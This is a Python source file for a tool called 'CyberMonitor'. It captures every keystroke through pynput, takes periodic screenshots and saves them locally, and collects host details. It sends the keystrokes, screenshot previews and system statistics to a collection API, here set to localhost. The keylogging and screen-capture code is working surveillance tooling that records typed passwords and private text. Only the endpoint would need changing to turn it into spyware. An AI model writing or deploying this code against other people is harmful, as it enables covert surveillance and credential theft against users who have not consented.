import os
import json
import time
import threading
import requests
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import platform
import socket
import psutil
import base64
from io import BytesIO

# Configuration
API_URL = "http://localhost:5000/api"
LOG_INTERVAL = 10  # seconds
SCREENSHOT_INTERVAL = 60  # seconds

class CyberMonitor:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.system_info = self.get_system_info()
        self.device_id = socket.gethostname()
        
    def get_system_info(self):
        """Gather system information"""
        hostname = socket.gethostname()
        try:
            ip = socket.gethostbyname(hostname)
        except:
            ip = "Unknown"
            
        return {
            "hostname": hostname,
            "platform": platform.system(),
            "version": platform.version(),
            "processor": platform.processor(),
            "ip": ip,
            "cpu_count": psutil.cpu_count(),
            "memory": psutil.virtual_memory().total // (1024**3)  # GB
        }
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            self.keys.append(str(key.char))
        except AttributeError:
            self.keys.append(str(key))
        
        self.count += 1
        
        if self.count >= 30:  # Send after 30 keystrokes
            self.send_keylog()
            self.count = 0
            self.keys = []
    
    def send_keylog(self):
        """Send keylog data to API"""
        if not self.keys:
            return
            
        try:
            data = {
                "type": "keylog",
                "data": "".join(self.keys),
                "deviceId": self.device_id,
                "deviceInfo": self.system_info,
                "severity": "medium" if len(self.keys) > 20 else "low"
            }
            response = requests.post(f"{API_URL}/logs", json=data)
            if response.status_code == 200:
                print(f"✅ Keylog sent: {len(self.keys)} keys")
        except Exception as e:
            print(f"❌ Error sending keylog: {e}")
    
    def take_screenshot(self):
        """Take and send screenshot"""
        try:
            screenshot = ImageGrab.grab()
            
            # Convert to base64
            buffered = BytesIO()
            screenshot.save(buffered, format="PNG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode()
            
            data = {
                "type": "screenshot",
                "data": {
                    "image": img_base64[:1000],  # Send preview only
                    "size": len(img_base64),
                    "timestamp": datetime.now().isoformat()
                },
                "deviceId": self.device_id,
                "deviceInfo": self.system_info,
                "severity": "low"
            }
            
            response = requests.post(f"{API_URL}/logs", json=data)
            if response.status_code == 200:
                print("✅ Screenshot sent")
                
            # Also save locally
            screenshot.save(f"screenshots/screenshot_{int(time.time())}.png")
        except Exception as e:
            print(f"❌ Error taking screenshot: {e}")
    
    def monitor_system(self):
        """Monitor system changes"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            data = {
                "type": "system",
                "data": {
                    "cpu_usage": cpu_percent,
                    "memory_usage": memory.percent,
                    "disk_usage": disk.percent,
                    "processes": len(psutil.pids()),
                    "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
                },
                "deviceId": self.device_id,
                "deviceInfo": self.system_info,
                "severity": "high" if cpu_percent > 80 else "low"
            }
            
            response = requests.post(f"{API_URL}/logs", json=data)
            if response.status_code == 200:
                print("✅ System info sent")
        except Exception as e:
            print(f"❌ Error monitoring system: {e}")
    
    def screenshot_timer(self):
        """Take periodic screenshots"""
        while True:
            time.sleep(SCREENSHOT_INTERVAL)
            self.take_screenshot()
    
    def system_monitor_timer(self):
        """Monitor system periodically"""
        while True:
            time.sleep(30)  # Every 30 seconds
            self.monitor_system()
    
    def start(self):
        """Start all monitoring"""
        print(f"""
╔══════════════════════════════════════╗
║      CYBER MONITOR ACTIVATED         ║
║                                      ║
║  Device: {self.device_id:<28}║
║  Platform: {self.system_info['platform']:<26}║
║  IP: {self.system_info['ip']:<32}║
║                                      ║
║  API: {API_URL:<31}║
║                                      ║
║  Press ESC to stop monitoring        ║
╚══════════════════════════════════════╝
        """)
        
        # Start screenshot thread
        screenshot_thread = threading.Thread(target=self.screenshot_timer, daemon=True)
        screenshot_thread.start()
        
        # Start system monitor thread
        system_thread = threading.Thread(target=self.system_monitor_timer, daemon=True)
        system_thread.start()
        
        # Send initial system info
        self.monitor_system()
        
        # Start keylogger
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    # Create screenshots directory if it doesn't exist
    os.makedirs("screenshots", exist_ok=True)
    
    monitor = CyberMonitor()
    monitor.start()
